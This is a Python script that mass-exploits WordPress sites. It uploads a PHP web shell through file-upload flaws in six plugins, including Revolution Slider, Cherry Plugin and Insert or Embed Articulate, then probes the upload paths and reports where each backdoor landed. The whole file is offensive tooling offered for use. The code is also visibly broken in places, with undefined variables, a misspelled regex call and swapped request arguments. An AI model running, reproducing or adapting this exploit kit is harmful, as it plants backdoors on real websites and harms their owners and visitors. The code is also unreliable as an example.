#!/usr/bin/python3
################################################
# Created By Dinar Hamid                       #
# module created by Galeh Rizky And Dinar Hamid#
# kerja bangsat                                #
################################################
import requests as req
from termcolor import colored
import sys,os,re

def addblokers(url):
	try:
		files = {'popimg':open('../shell/evil.php','rb')}
		http = req.post(url+"/wp-admin/admin-ajax.php?action=getcountryuser&cs=2",headers=headers,files=files)
		new_url = url+"/wp-content/uploads/"+years+"/"+month+"/evil.php?ispwd"
		check = req.get(new_url,headers=headers)
		if 'PWDxD3pTeam' in check.text:
			print(colored("{} VULNERABLE ADDBLOCKERS FILE UPLOADS".format(url),'green'))
			print(colored("BACKDOOR LOCATED AT : {}".format(new_url),'green'))
			save(new_url)
		else:
			print(colored("{} NOT VULNERABLE ADDBLOCKERS FILE UPLOADS".format(url),'red'))
	except:
		print(colored("seems we got error in function addblockers",'red'))

def blaze(url):
	try:
		files = {'album_img':open('../shell/evil.php','rb')}
		data = {'task':'blaze_add_new_album','album_name':'','album_desc':''}
		http = req.post(url+"/wp-admin/admin.php?page=blaze_manage",headers=headers,files=files,data=data)
		if 'evil.php' in http.text:
			hasil = re.findall('blaze\/([a-zA-Z0-9]+)\/big')
			new_url = url+"/wp-content/uploads/blaze/"+hasil+"/big/evil.php?ispwd"
			check_shell = req.get(new_url,headers=headers)
			if 'PWDxD3pTeam' in check_shell.text:
				print(colored("{} VULNERABLE BLAZE FILE UPLOADS".format(url),'green'))
				print(colored("BACKDOOR LOCATED AT : {}".format(new_url),'green'))
				save(new_url)
			else:
				print(colored("{} NOT VULNERABLE BLAZE FILE UPLOADS".format(url),'red'))
		else:
			print(colored("{} NOT VULNERABLE BLAZE FILE UPLOADS".format(url),'red'))
	except:
		print(colored("seems we got error in function blaze",'red'))

def catpro(url):
	try:
		files = {'album_img':open('../shell/evil.php','rb')}
		data = {'task':'cpr_add_new_album','album_name':'','album_desc':''}
		http = req.post(url+"/wp-admin/admin.php?page=catpro_manage")
		if 'evil.php' in http.text:
			hasil = re.findal('blaze\/([a-zA-Z0-9]+)\/big')
			new_url = url+"/wp-content/uploads/catpro/"+hasil+"/big/evil.php?ispwd"
			check_shell = req.get(new_url,headers=headers)
			if 'PWDxD3pTeam' in check_shell.text:
				print(colored("{} VULNERABLE CATPRO FILE UPLOADS".format(url),'green'))
				print(colored("BACKDOOR LOCATED AT : {}".format(new_url),'green'))
				save(new_url)
			else:
				print(colored("{} NOT VULNERABLE CATPRO FILE UPLOADS".format(url),'red'))
		else:
			print(colored("{} NOT VULNERABLE CATPRO FILE UPLOADS".format(url),'red'))
	except:
		print(colored("seems we got error in function CATPRO",'red'))

def cerry_plugin(url):
	try:
		files = {'file':open('../shell/evil.php','rb')}
		hantam = req.post(url+"/wp-content/plugins/cherry-plugin/admin/import-export/upload.php",headers=headers,files=files)
		new_url = url+"/wp-content/plugins/cherry-plugin/admin/import-export/evil.php?ispwd"
		check_shell = req.get(new_url,headers=headers)
		if 'PWDxD3pTeam' in check_shell.text:
			print(colored("{} VULNERABLE CERRY PLUGIN FILE UPLOADS".format(url),'green'))
			print(colored("BACKDOOR LOCATED AT : {}".format(new_url),'green'))
			save(new_url)
		else:
			print(colored("{} NOT VULNERABLE CERRY PLUGIN FILE UPLOADS".format(url),'red'))
	except:
		print(colored("seems we got error in function cerry plugins",'red'))

def insertorembed(url):
		try:
			data = {'name':'kontoljaran.zip','chunk':'2','chunks':'3'}
			files = {'file':open('../shell/kontoljaran.zip','rb')}
			hantam = req.post(url+"/index.php/wp-json/articulate/v1/upload-data", headers=headers, data=data,files=files)
			if 'Upload' in hantam.text:
				new_url = url+"/wp-content/uploads/articulate_uploads/kontoljaran/dt.php"
				check_shell = req.get(new_url,headers=headers)
				if 'DEPRESSIONSHELL' in check_shell.text:
					print(colored("{} VULNERABLE Insert or Embed Articulate file upload".format(url),'green'))
					print(colored("BACKDOOR LOCATED AT : {}".format(new_url),'green'))
				else:
					print(colored("{} NOT VULNERABLE insert or embed Articulate file upload".format(url),'red'))
			else:
				print(colored("{} NOT VULNERABLE insert or embed Articulate file upload".format(url),'red'))
		except Exception as e:
			print((colored("seems we got error in function insertorembed")))

def revsliderupload(url):
		try:
			data = {'update_file':open('../shell/kontoljaran.zip','rb')}
			files = {'action':'revslider_ajax_action','client_action':'update_plugin'}
			req.post(url+"/wp-admin/admin-ajax.php",headers=headers,data=data,files=files)
			access_shell = ["/wp-content/plugins/revslider/temp/update_extract/revslider/dt.php","/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/dt.php","/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/dt.php","/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/dt.php","/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/dt.php","/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/dt.php","/wp-content/themes/centum/revslider/temp/update_extract/revslider/dt.php","/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/dt.php","/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/dt.php","/wp-content/themes/pindol/revslider/temp/update_extract/revslider/dt.php","/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/dt.php","/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/dt.php","/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/dt.php"]
			for access in access_shell:
				check_shell = req.get(url+access,headers=headers)
				if 'DEPRESSIONSHELL' in check_shell.text:
					print(colored("{} VULNERABLE REVSLIDER FILE UPLOADS".format(url),'green'))
					print(colored("BACKDOOR LOCATED AT : {}".format(url+access),'green'))
				else:
					print(colored("{} NOT VULNERABLE REVSLIDER FILE UPLOADS".format(url),'red'))
		except Exception as e:
			print(colored("Seems we got error in function insertorembed"))

def wpexploit(url):
		insertorembed(url)
		revsliderupload(url)
		addblokers(url)
		blaze(url)
		catpro(url)
		cerry_plugin(url)
